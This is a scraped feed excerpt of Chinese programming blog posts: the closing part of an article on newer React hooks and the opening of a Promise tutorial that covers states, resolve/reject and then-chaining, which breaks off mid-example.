<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> /&gt;</span></span> <span class="hljs-comment">// inputRef.current 就是原生 input 元素</span>
</code></pre>
<p>但你可能<strong>不想让父组件直接操作 DOM</strong>（比如改样式、读 value），而只允许它调用 <code>focus()</code> 或 <code>clear()</code>。
这时就用 <code>useImperativeHandle</code>：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { forwardRef, useImperativeHandle, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>; 
<span class="hljs-keyword">const</span> <span class="hljs-title class_">MyInput</span> = <span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> { 
<span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>); 
<span class="hljs-comment">//  关键：自定义 ref 暴露的内容 </span>
	<span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> ({ 
	<span class="hljs-attr">focus</span>: <span class="hljs-function">() =&gt;</span> { 
		inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>(); 
	}, 
	<span class="hljs-attr">clear</span>: <span class="hljs-function">() =&gt;</span> { inputRef.<span class="hljs-property">current</span>.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>; } 
	<span class="hljs-comment">// 不暴露 inputRef.current 本身！ </span>
	})); 
	<span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> {<span class="hljs-attr">...props</span>} /&gt;</span></span>; });
</code></pre>
<p>父组件使用：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> myInputRef = <span class="hljs-title function_">useRef</span>(); <span class="hljs-comment">// 只能调用你允许的方法 </span>
	myInputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>(); <span class="hljs-comment">// 可以 </span>
	myInputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">clear</span>(); <span class="hljs-comment">// 可以 </span>
	myInputRef.<span class="hljs-property">current</span>.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">'red'</span>; <span class="hljs-comment">// 报错！没有 style 属性</span>
</code></pre>
<p>这并不是一个万能的方式，其实它很容易被props所替代，但是如果正在做一个极其复杂的组件，那么可以尝试使用这个hooks。</p>
<h3 data-id="heading-8">useOptimistic</h3>
<p>官方描述：<code>useOptimistic</code> 是一个 React Hook，它可以帮助你更乐观地更新用户界面。
官方说了和没说一样，但用人话说就是虽然还没到可以更新的时候，我先更新了，可以增加用户体验。这种做法让界面响应速度与网络延迟实现了脱钩。最典型的例子就是“点赞”按钮。
举个例子，我们现在有一个开关，每次改变开关都会调一次接口，我们根据接口的返回值判断是否更新页面渲染。但是这个时候大概率会一卡一卡的，尤其是接口没返回就点击下一次，那么最终的状态可能和我们理想的状态不一致。
传统的做法是我们再维护一个状态为pending，没有结束的时候不能点击。此时如果业务逻辑已经很复杂了，添加的状态只会让代码更加复杂。
<code>useOptimistic</code>做的事情是先改变状态，再请求到结果，如果调用失败或者返回失败那么再变回去。比如说点赞红心。
虽然<code>useOptimistic</code>正在被react逐渐推向一等公民的身份，但是仍然有问题，它更适合做一些简单可回滚的操作，比如说点赞，并没有很广的适用性。</p>
<h3 data-id="heading-9">useDeferredValue</h3>
<p>官方描述：<code>useDeferredValue</code> 是一个 React Hook，可以让你延迟更新 UI 的某些部分。
这是一个面试常考的hooks，作为性能优化的一种方式。
举个例子，当你在输入框中进行输入，下面的列表就跟着渲染，此时再react的渲染机制中他们的权重是一致的，一旦表单发生改变，输入框与大列表同时渲染那么就会卡卡的。<code>useDeferredValue</code>做的事就是让列表的优先级放低，此时优先输入框渲染。
但是如果是数据量没有那么大的情况下使用<code>useDeferredValue</code>还会反向影响。</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { useState, useDeferredValue } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;  

<span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchPage</span>(<span class="hljs-params"/>) {  
<span class="hljs-keyword">const</span> [query, setQuery] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);  
<span class="hljs-keyword">const</span> deferredQuery = <span class="hljs-title function_">useDeferredValue</span>(query);  
<span class="hljs-comment">// ...  </span>
}
</code></pre>
<h3 data-id="heading-10">useTransition</h3>
<p>官方描述：<code>useTransition</code> 是一个让你可以在后台渲染部分 UI 的 React Hook。
这个同样是作为优化的新特性，面试会考。<code>useTransition</code> 的核心原理基于 React 的并发模式（Concurrent Mode）。在并发模式下，React 可以暂停、中止或重新启动渲染任务，根据任务的优先级灵活调度。<code>useTransition</code> 会将更新任务标记为低优先级，使得高优先级的用户交互事件能够优先得到处理，避免界面出现假死或卡顿现象。</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> {useState, useTransition} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;  

<span class="hljs-keyword">function</span> <span class="hljs-title function_">CheckoutForm</span>(<span class="hljs-params"/>) {  
<span class="hljs-keyword">const</span> [isPending, startTransition] = <span class="hljs-title function_">useTransition</span>();  
<span class="hljs-comment">// ……  </span>
}
</code></pre>
<ul>
<li><strong>startTransition</strong>：用于包裹非紧急状态更新的函数</li>
<li><strong>isPending</strong>：布尔值，表示过渡是否进行中</li>
</ul>

























<table><thead><tr><th>场景</th><th>推荐 Hook</th></tr></thead><tbody><tr><td>用户输入后需要更新大量列表（如搜索）</td><td>两者都可用，但 <code>useDeferredValue</code> 更简洁</td></tr><tr><td>多个状态更新中，只想延迟其中一部分</td><td><code>useTransition</code></td></tr><tr><td>不想改动状态更新逻辑，只延迟渲染结果</td><td><code>useDeferredValue</code></td></tr><tr><td>需要显示“加载中”状态</td><td><code>useTransition</code>（自带 <code>isPending</code>）</td></tr></tbody></table>
<p><strong><code>useTransition</code> 控制“更新是否紧急”，<code>useDeferredValue</code> 控制“值是否立即渲染”。</strong></p>
<h2 data-id="heading-11">总结</h2>
<p>这些hooks可以分为四类</p>

























<table><thead><tr><th>类型</th><th>hooks</th></tr></thead><tbody><tr><td>处理表单类</td><td>useActionState、useFormStatus</td></tr><tr><td>hooks衍生类</td><td>useEffectEvent、useInsertionEffect、useImperativeHandle</td></tr><tr><td>提升用户体验类</td><td>useOptimistic、useDeferredValue、useTransition</td></tr><tr><td>协助开发类</td><td>useSyncExternalStore、useDebugValue</td></tr></tbody></table>
<p>总体而言这些hooks都是为了解决特殊场景的特殊方案，不具有普适性，当项目应用范围小，数据量低等场景，基础的hooks就能满足需求。之后我会汇总react性能优化方案，将<code>useOptimistic</code>、<code>useDeferredValue</code>、<code>useTransition</code>详细介绍。对一些衍生类的hooks进行拆解，解析其中的原理。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🔥Promise 从入门到精通：彻底解决前端异步回调问题！！！]]></title>    <link>https://juejin.cn/post/7602921143490117675</link>    <guid>https://juejin.cn/post/7602921143490117675</guid>    <pubDate>2026-02-05T03:06:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602921143490117675" data-draft-id="7603004323870834731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🔥Promise 从入门到精通：彻底解决前端异步回调问题！！！"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-05T03:06:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小马_xiaoen"/> <meta itemprop="url" content="https://juejin.cn/user/4438063859920414"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🔥Promise 从入门到精通：彻底解决前端异步回调问题！！！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4438063859920414/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小马_xiaoen
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T03:06:55.000Z" title="Thu Feb 05 2026 03:06:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读23分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"「"}.markdown-body b:after,.markdown-body strong:after{content:"」"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">Promise 从入门到精通：彻底解决前端异步回调问题</h2>
<h3 data-id="heading-1">🚀 一、Promise 核心介绍</h3>
<h4 data-id="heading-2">1. 什么是 Promise？</h4>
<p>Promise 是 ES6（ECMAScript 2015）引入的<strong>异步编程解决方案</strong>，是一个用于封装异步操作并管理其结果的对象。它解决了传统异步编程中<strong>回调地狱（Callback Hell）</strong> 的嵌套问题，让异步代码的逻辑更清晰、更易维护，同时提供了统一的异步错误处理机制，是现代前端异步编程的基础（async/await 正是基于 Promise 实现的语法糖）。</p>
<p>简单来说：Promise 就像一个<strong>异步操作的“承诺”</strong> —— 异步操作执行前，它处于等待状态；异步操作完成后，它会兑现“承诺”（返回成功结果）或拒绝“承诺”（返回失败原因），且这个结果一旦确定就<strong>不可修改</strong>。</p>
<h4 data-id="heading-3">2. 核心特性</h4>
<ul>
<li><strong>状态不可逆</strong>：Promise 有且仅有三种状态，状态一旦改变，就会永久保持该状态，不会再发生变化；</li>
<li><strong>统一的异步范式</strong>：将不同类型的异步操作（AJAX、定时器、文件操作等）封装为统一的 Promise 接口，解决异步操作格式不统一的问题；</li>
<li><strong>链式调用</strong>：支持 <code>.then()</code>、<code>.catch()</code>、<code>.finally()</code> 链式调用，替代多层回调嵌套，让异步代码线性化；</li>
<li><strong>集中错误处理</strong>：支持全局错误捕获，一个 <code>.catch()</code> 可捕获链式调用中所有前置操作的错误，避免单独处理每个异步操作的异常；</li>
<li><strong>非阻塞执行</strong>：Promise 封装的异步操作不会阻塞浏览器主线程，保证页面交互的流畅性；</li>
<li><strong>一次性执行</strong>：Promise 内部的异步操作一旦执行，就会完成整个流程，不会被重复触发。</li>
</ul>
<h4 data-id="heading-4">3. 解决的核心问题：回调地狱</h4>
<p>传统异步编程依赖回调函数，当多个异步操作存在<strong>顺序依赖</strong>（后一个操作依赖前一个操作的结果）时，会出现多层回调嵌套，形成<strong>回调地狱</strong>，代码表现为「层层缩进的金字塔结构」，存在<strong>可读性差、维护困难、错误无法统一捕获</strong>等问题。</p>
<p><strong>回调地狱示例（定时器嵌套）</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 需求：依次执行三个异步操作，后一个操作等待前一个完成</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'第一步操作完成'</span>);
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'第二步操作完成'</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'第三步操作完成'</span>);
      <span class="hljs-comment">// 更多嵌套...</span>
    }, <span class="hljs-number">1000</span>);
  }, <span class="hljs-number">1000</span>);
}, <span class="hljs-number">1000</span>);
</code></pre>
<p><strong>Promise 改造后（链式调用，无嵌套）</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 封装Promise版定时器</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">delay</span>(<span class="hljs-params">time</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, time));
}

<span class="hljs-comment">// 线性链式调用，逻辑清晰</span>
<span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'第一步操作完成'</span>))
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>))
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'第二步操作完成'</span>))
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>))
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'第三步操作完成'</span>));
</code></pre>
<p>对比可见：Promise 彻底摆脱了回调嵌套，让异步代码的执行流程与同步代码一致，大幅提升了代码的可读性和可维护性。</p>
<h4 data-id="heading-5">4. Promise 与传统异步方案的对比</h4>















































<table><thead><tr><th>特性</th><th>Promise</th><th>传统回调函数</th><th>async/await</th></tr></thead><tbody><tr><td>代码结构</td><td>链式调用，无嵌套</td><td>多层嵌套，回调地狱</td><td>同步化写法，最简洁</td></tr><tr><td>错误处理</td><td>统一 <code>.catch()</code> 捕获</td><td>每个回调单独处理错误</td><td>try/catch 捕获，更符合直觉</td></tr><tr><td>异步流程控制</td><td>原生支持（.then 链式）</td><td>手动嵌套控制</td><td>同步流程控制（基于Promise）</td></tr><tr><td>学习成本</td><td>中等</td><td>低（但复杂场景易出错）</td><td>高（需先掌握Promise）</td></tr><tr><td>依赖关系</td><td>无（ES6原生）</td><td>无</td><td>依赖Promise（ES7）</td></tr><tr><td>适用场景</td><td>简单至复杂异步流程</td><td>简单异步操作（无依赖）</td><td>复杂异步流程、多请求依赖</td></tr></tbody></table>
<p><strong>核心结论</strong>：async/await 是 Promise 的语法糖，传统回调是基础，Promise 是现代前端异步编程的<strong>核心桥梁</strong>。</p>
<h3 data-id="heading-6">🎯 二、Promise 核心概念</h3>
<h4 data-id="heading-7">1. 三种状态与状态转换</h4>
<p>Promise 的核心是<strong>状态管理</strong>，其一生仅有三种状态，且状态转换<strong>不可逆、仅能发生一次</strong>，这是 Promise 解决异步不确定性的关键。</p>
<h5 data-id="heading-8">三种基础状态</h5>
<ol>
<li><strong>pending（进行中）</strong>：初始状态，异步操作尚未完成，此时既未成功也未失败；</li>
<li><strong>fulfilled（已成功）</strong>：异步操作顺利完成，Promise 兑现承诺，返回成功结果；</li>
<li><strong>rejected（已失败）</strong>：异步操作执行失败，Promise 拒绝承诺，返回失败原因（错误对象）。</li>
</ol>
<h5 data-id="heading-9">唯一的两种状态转换路径</h5>
<p>Promise 只能从初始状态向最终状态转换，且转换后状态永久固定，<strong>无法反向转换，也无法在成功/失败之间切换</strong>：</p>
<ul>
<li>路径1：<code>pending</code> → <code>fulfilled</code>（异步操作成功，调用 <code>resolve()</code> 触发）；</li>
<li>路径2：<code>pending</code> → <code>rejected</code>（异步操作失败，调用 <code>reject()</code> 触发）。</li>
</ul>
<p><strong>核心注意</strong>：一旦状态变为 <code>fulfilled</code> 或 <code>rejected</code>，就会成为<strong>定型状态（settled）</strong>，后续再调用 <code>resolve()</code> 或 <code>reject()</code> 均无效。</p>
<h4 data-id="heading-10">2. 两个核心回调函数</h4>
<p>Promise 构造函数接收一个<strong>执行器函数（executor）</strong>，该函数会在 Promise 创建时<strong>立即同步执行</strong>，且接收两个内置的核心回调函数作为参数，用于手动触发状态转换：</p>
<ol>
<li><strong>resolve(result)</strong>：将 Promise 状态从 <code>pending</code> 转为 <code>fulfilled</code>，并将异步操作的<strong>成功结果</strong>传递出去（result 可为任意类型：基本类型、对象、数组，甚至另一个 Promise）；</li>
<li><strong>reject(reason)</strong>：将 Promise 状态从 <code>pending</code> 转为 <code>rejected</code>，并将异步操作的<strong>失败原因</strong>传递出去（reason 通常为 Error 对象，便于后续错误捕获和栈追踪）。</li>
</ol>
<p><strong>核心注意</strong>：执行器函数是<strong>同步执行</strong>的，内部的异步操作是<strong>异步执行</strong>的，这是容易混淆的关键点，示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Promise 执行器函数：同步执行'</span>); <span class="hljs-comment">// 立即输出</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'异步操作：异步执行'</span>); <span class="hljs-comment">// 1秒后输出</span>
    <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'异步操作成功'</span>);
  }, <span class="hljs-number">1000</span>);
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Promise 创建完成'</span>); <span class="hljs-comment">// 执行器后立即输出</span>
</code></pre>
<p><strong>输出顺序</strong>：Promise 执行器函数 → Promise 创建完成 → 异步操作：异步执行。</p>
<h4 data-id="heading-11">3. 定型状态（Settled）</h4>
<p>定型状态是 Promise 的<strong>最终状态统称</strong>，指 Promise 已完成状态转换，不再处于 <code>pending</code> 状态，包含两种情况：</p>
<ul>
<li><code>fulfilled</code>（已成功）是定型状态；</li>
<li><code>rejected</code>（已失败）也是定型状态。</li>
</ul>
<p>后续的 <code>.then()</code>、<code>.catch()</code>、<code>.finally()</code> 方法，本质都是<strong>监听 Promise 的定型状态</strong>，一旦状态定型，就会执行对应的回调函数。</p>
<h3 data-id="heading-12">📁 三、Promise 实例的核心方法</h3>
<p>Promise 实例提供了 <code>.then()</code>、<code>.catch()</code>、<code>.finally()</code> 三个核心原型方法，均支持<strong>链式调用</strong>（核心原因：每个方法执行后都会<strong>返回一个新的 Promise 实例</strong>，而非原实例），这是解决回调地狱的关键。</p>
<p>所有方法的回调函数都会被加入<strong>微任务队列</strong>，在浏览器主线程同步代码执行完成后、宏任务执行前执行（Promise 属于微任务，这是事件循环的重要知识点）。</p>
<h4 data-id="heading-13">1. then(onFulfilled, onRejected)：处理成功/失败结果</h4>
<p><code>.then()</code> 是 Promise 最核心的方法，用于<strong>监听 Promise 的定型状态</strong>，接收两个可选的回调参数：</p>
<ul>
<li><strong>onFulfilled(result)</strong>：可选，Promise 状态为 <code>fulfilled</code> 时执行，参数 <code>result</code> 是 <code>resolve()</code> 传递的成功结果；</li>
<li><strong>onRejected(reason)</strong>：可选，Promise 状态为 <code>rejected</code> 时执行，参数 <code>reason</code> 是 <code>reject()</code> 传递的失败原因。</li>
</ul>
<h5 data-id="heading-14">核心特性</h5>
<ol>
<li><strong>链式调用基础</strong>：<code>.then()</code> 执行后返回<strong>新的 Promise 实例</strong>，新实例的状态由当前回调函数的执行结果决定；</li>
<li><strong>参数可选</strong>：可只传 <code>onFulfilled</code>（仅处理成功），也可只传 <code>onRejected</code>（但更推荐用 <code>.catch()</code> 处理失败）；</li>
<li><strong>值的传递</strong>：若回调函数返回一个普通值（非 Promise、非抛出错误），新 Promise 会以 <code>fulfilled</code> 状态将该值传递给下一个 <code>.then()</code>；</li>
<li><strong>错误透传</strong>：若回调函数抛出错误，新 Promise 会以 <code>rejected</code> 状态将错误传递给后续的 <code>.catch()</code> 或 <code>.then()</code> 的 <code>onRejected</code>。</li>
</ol>
<h5 data-id="heading-15">基础使用示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> random = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();
  <span class="hljs-keyword">if</span> (random &gt; <span class="hljs-number">0.5</span>) {
    <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`成功：随机数<span class="hljs-subst">${random.toFixed(<span class="hljs-number">2</span>)}</span>`</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`失败：随机数<span class="hljs-subst">${random.toFixed(<span class="hljs-number">2</span>)}</span>`</span>));
  }
});

<span class="hljs-comment">// 处理成功和失败</span>
p.<span class="hljs-title function_">then</span>(
  <span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'then成功回调：'</span>, res),
  <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'then失败回调：'</span>, err.<span class="hljs-property">message</span>)
);
</code></pre>
<h5 data-id="heading-16">链式调用示例（核心）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 链式调用：依次处理，值的传递</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-number">1</span>))
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'第一步：'</span>, num); <span class="hljs-comment">// 1</span>
    <span class="hljs-keyword">return</span> num + <span class="hljs-number">1</span>; <span class="hljs-comment">// 返回普通值，传递给下一个then</span>
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'第二步：'</span>, num); <span class="hljs-comment">// 2</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(num + <span class="hljs-number">1</span>), <span class="hljs-number">1000</span>)); <span class="hljs-comment">// 返回Promise</span>
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
